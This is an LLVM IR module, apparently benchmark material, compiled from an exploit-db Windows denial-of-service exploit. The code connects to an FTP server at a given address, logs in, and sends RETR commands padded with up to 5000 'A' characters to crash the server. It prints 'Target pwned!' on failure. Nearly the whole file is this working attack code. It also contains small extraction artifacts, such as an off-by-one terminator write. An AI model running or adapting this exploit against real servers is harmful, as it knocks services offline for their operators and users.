; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_6458.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_6458.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"RETR %s\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"Target pwned!\0A\00", align 1
@errno = common dso_local global i32 0, align 4
@EXIT_SUCCESS = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i32, i32* @AF_INET, align 4
  %13 = load i32, i32* @SOCK_STREAM, align 4
  %14 = call i32 @socket(i32 %12, i32 %13, i32 0)
  store i32 %14, i32* %9, align 4
  %15 = call i32 @bzero(%struct.sockaddr_in* %6, i32 12)
  %16 = load i32, i32* @AF_INET, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %16, i32* %17, align 4
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @inet_addr(i8* %20)
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %23 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i32 0, i32 0
  store i32 %21, i32* %23, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 2
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26)
  %28 = call i32 @htons(i32 %27)
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %28, i32* %29, align 4
  %30 = load i32, i32* %9, align 4
  %31 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %32 = call i32 @connect(i32 %30, %struct.sockaddr* %31, i32 4)
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 3
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @strlen(i8* %35)
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 4
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 @strlen(i8* %39)
  %41 = sub nsw i32 %36, %40
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 3
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 @strlen(i8* %44)
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 4
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = call i32 @min(i32 %45, i32 %49)
  %51 = add nsw i32 %41, %50
  %52 = add nsw i32 %51, 8
  %53 = sext i32 %52 to i64
  %54 = mul i64 1, %53
  %55 = trunc i64 %54 to i32
  %56 = call i8* @malloc(i32 %55)
  store i8* %56, i8** %10, align 8
  %57 = load i8*, i8** %10, align 8
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 3
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 @sprintf(i8* %57, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str, i64 0, i64 0), i8* %60)
  %62 = load i32, i32* %9, align 4
  %63 = load i8*, i8** %10, align 8
  %64 = load i8*, i8** %10, align 8
  %65 = call i32 @strlen(i8* %64)
  %66 = call i32 @write(i32 %62, i8* %63, i32 %65)
  %67 = load i8*, i8** %10, align 8
  %68 = load i8**, i8*** %5, align 8
  %69 = getelementptr inbounds i8*, i8** %68, i64 4
  %70 = load i8*, i8** %69, align 8
  %71 = call i32 @sprintf(i8* %67, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.1, i64 0, i64 0), i8* %70)
  %72 = load i32, i32* %9, align 4
  %73 = load i8*, i8** %10, align 8
  %74 = load i8*, i8** %10, align 8
  %75 = call i32 @strlen(i8* %74)
  %76 = call i32 @write(i32 %72, i8* %73, i32 %75)
  %77 = load i8*, i8** %10, align 8
  %78 = call i32 @free(i8* %77)
  store i32 1, i32* %7, align 4
  br label %79

79:                                               ; preds = %120, %2
  %80 = load i32, i32* %7, align 4
  %81 = icmp sle i32 %80, 5
  br i1 %81, label %82, label %123

82:                                               ; preds = %79
  %83 = load i32, i32* %7, align 4
  %84 = sext i32 %83 to i64
  %85 = mul i64 1000, %84
  %86 = trunc i64 %85 to i32
  store i32 %86, i32* %8, align 4
  %87 = load i32, i32* %8, align 4
  %88 = add nsw i32 %87, 1
  %89 = call i8* @malloc(i32 %88)
  store i8* %89, i8** %11, align 8
  %90 = load i8*, i8** %11, align 8
  %91 = load i32, i32* %8, align 4
  %92 = call i32 @memset(i8* %90, i8 signext 65, i32 %91)
  %93 = load i8*, i8** %11, align 8
  %94 = load i32, i32* %8, align 4
  %95 = add nsw i32 %94, 1
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %93, i64 %96
  store i8 0, i8* %97, align 1
  %98 = load i32, i32* %8, align 4
  %99 = add nsw i32 %98, 9
  %100 = call i8* @malloc(i32 %99)
  store i8* %100, i8** %10, align 8
  %101 = load i8*, i8** %10, align 8
  %102 = load i8*, i8** %11, align 8
  %103 = call i32 @sprintf(i8* %101, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i8* %102)
  %104 = load i32, i32* %9, align 4
  %105 = load i8*, i8** %10, align 8
  %106 = load i8*, i8** %10, align 8
  %107 = call i32 @strlen(i8* %106)
  %108 = call i32 @write(i32 %104, i8* %105, i32 %107)
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %110, label %114

110:                                              ; preds = %82
  %111 = call i32 @perror(i32* null)
  %112 = load i32, i32* @errno, align 4
  %113 = call i32 @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0), i32 %112)
  br label %114

114:                                              ; preds = %110, %82
  %115 = load i8*, i8** %10, align 8
  %116 = call i32 @free(i8* %115)
  %117 = load i8*, i8** %11, align 8
  %118 = call i32 @free(i8* %117)
  %119 = call i32 @sleep(i32 1)
  br label %120

120:                                              ; preds = %114
  %121 = load i32, i32* %7, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %7, align 4
  br label %79

123:                                              ; preds = %79
  %124 = load i32, i32* %9, align 4
  %125 = call i32 @close(i32 %124)
  %126 = load i32, i32* @EXIT_SUCCESS, align 4
  ret i32 %126
}

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @min(i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @perror(i32*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
